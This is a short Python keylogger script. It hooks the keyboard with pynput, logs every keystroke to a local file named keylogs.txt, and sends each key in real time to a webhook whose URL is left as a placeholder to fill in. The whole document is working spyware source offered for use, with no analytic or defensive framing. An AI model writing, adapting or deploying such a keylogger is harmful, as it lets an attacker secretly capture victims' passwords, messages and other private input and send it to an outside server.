#import some stuff

from pynput.keyboard import Key, Listener
from dhooks import Webhook #pip install dhooks
import logging

log_dir = ""

# URL HERE
log_send = Webhook('here')

#save the file as keylogs.txt

logging.basicConfig(filename=(log_dir + "keylogs.txt"), \
	level=logging.DEBUG, format='%(asctime)s: %(message)s')
    #print("action 1")

#log_send.send('DBG')

def on_press(key):
    logging.info(str(key))

    #print the key
    print(key)

    #log the key
    log_send.send(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()